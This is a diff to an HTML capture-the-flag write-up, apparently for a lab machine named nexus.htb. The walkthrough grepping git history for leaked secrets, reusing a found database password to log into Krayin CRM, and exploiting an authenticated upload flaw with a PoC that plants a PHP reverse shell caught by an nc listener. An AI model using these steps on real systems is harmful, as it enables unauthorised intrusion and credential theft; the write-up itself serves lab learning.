@@ -167,7 +167,6 @@ cd krayin-docker-setup
 git log --all -p | grep -i "password\|api_key\|secret\|token"</code></pre>
 <img src="https://i.imgur.com/NI49iUl.png" alt="Grepping through git log -p output and finding the old password" />
 <p>Credentials were found!</p>
-<img src="https://i.imgur.com/vbysExG.png" alt="Krayin dashboard" />
 <pre><code>-DB_PASSWORD=N27xh!!2ucY04
 +DB_PASSWORD=</code></pre>
 
@@ -175,12 +174,14 @@ git log --all -p | grep -i "password\|api_key\|secret\|token"</code></pre>
 <p>Decided to use the same password using the <code>j.matthew@nexus.htb</code> account.</p>
 <img src="https://i.imgur.com/2QfMsJ3.png" alt="Logging into Krayin and landing on the dashboard" />
 <p>Credentials worked!</p>
+ <img src="https://i.imgur.com/vbysExG.png" alt="Krayin dashboard"/> 
 <p>Upon searching the version of Krayin, it seems this version had a CVE — <strong>CVE-2026-38526 / EDB-ID 52629</strong>, an authenticated RCE. Krayin uses TinyMCE for rich-text fields, and TinyMCE's in-editor image upload hits a server-side endpoint meant to accept only images. The file-type validation on that endpoint isn't strict enough to block a <code>.php</code> upload, and uploaded files land directly under the web-accessible <code>storage/tinymce/</code> directory — so any authenticated user can upload a PHP web shell through what's meant to be an image uploader, then just browse to the returned path to get code execution.</p>
 <p>From here, downloaded the python POC and ran it against the billing subdomain with the payload being a PHP reverse shell by Pentest Monkey.</p>
 <pre><code>python3 52629.py -t http://billing.nexus.htb -u j.matthew@nexus.htb -p 'N27xh!!2ucY04' -f php-reverse-shell.php
 
 nc -lvnp 4444</code></pre>
 <img src="https://i.imgur.com/twgMfS7.png" alt="Running the Krayin CVE PoC" />
+<p>After running the POC, clicked on the link produced by it which then led to our netcat session being opened!</p>
 <img src="https://i.imgur.com/CrB5r7Y.png" alt="catching a www-data reverse shell" />
 <p>Got a shell as <code>www-data</code>.</p>
 
